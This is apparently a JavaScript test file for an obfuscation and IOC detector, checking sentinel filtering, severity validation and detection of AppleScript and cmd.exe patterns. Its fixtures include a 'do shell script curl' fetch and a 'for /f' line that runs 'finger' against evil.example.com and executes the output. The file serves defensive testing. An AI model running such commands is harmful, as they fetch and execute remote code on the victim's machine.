'use strict';
// decoder-ioc-chokepoint.test.js — sentinel-gated _patternIocs emissions
// via DecoderIoc across obfuscation decoders.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const detectorModules = [
  'src/constants.js',
  'src/decoder-ioc.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/cmd-obfuscation.js',
];

test('DecoderIoc.pattern drops labels carrying unresolved sentinels', () => {
  const ctx = loadModules(['src/constants.js', 'src/decoder-ioc.js'], {
    expose: ['DecoderIoc', 'hasUnresolvedSentinel'],
  });
  const bad = ctx.DecoderIoc.pattern('sink — https://⟨unresolved:HOST⟩/path', 'high');
  assert.equal(bad, null);
  const good = ctx.DecoderIoc.pattern('AppleScript Reassembled Shell Command', 'high');
  assert.ok(good);
  assert.equal(good.severity, 'high');
});

test('applescript runtime URL fetch: _patternIocs omit sentinel-bearing URL labels', () => {
  const ctx = loadModules([
    ...detectorModules,
    'src/decoders/applescript-obfuscation.js',
  ]);
  const d = new ctx.EncodedContentDetector();
  const text = [
    'set _u to do shell script "curl -s https://⟨unresolved:HOST⟩/x"',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {}) || [];
  const hits = host(cands).filter(c => c.technique === 'AppleScript Runtime URL Fetch');
  for (const c of hits) {
    if (!Array.isArray(c._patternIocs)) continue;
    for (const row of c._patternIocs) {
      assert.ok(!ctx.hasUnresolvedSentinel(row.url),
        `sentinel leaked into _patternIocs: ${row.url}`);
    }
  }
});

test('cmd for /f do call: _patternIocs emitted via DecoderIoc', () => {
  const ctx = loadModules(detectorModules);
  const d = new ctx.EncodedContentDetector();
  const text = 'for /f "tokens=*" %A in (\'finger user@evil.example.com\') do call %A';
  const cands = d._findCommandObfuscationCandidates(text, {}) || [];
  const cand = host(cands).find(c => c._forFCall);
  assert.ok(cand, `expected for /f candidate; got ${JSON.stringify(host(cands))}`);
  assert.ok(Array.isArray(cand._patternIocs) && cand._patternIocs.length === 1);
  assert.match(cand._patternIocs[0].url, /for\s*\/f.*call %X/i);
  assert.equal(cand._patternIocs[0].severity, 'high');
});

test('DecoderIoc.pattern: rejects invalid severity', () => {
  const ctx = loadModules(['src/constants.js', 'src/decoder-ioc.js'], {
    expose: ['DecoderIoc'],
  });
  assert.throws(() => ctx.DecoderIoc.pattern('https://x.invalid/', 'hight'), RangeError);
  assert.throws(() => ctx.DecoderIoc.pattern('https://x.invalid/', 'HIGH'), RangeError);
  // Valid values pass:
  for (const sev of ['low', 'medium', 'high', 'critical']) {
    assert.equal(ctx.DecoderIoc.pattern('https://x.invalid/', sev).severity, sev);
  }
});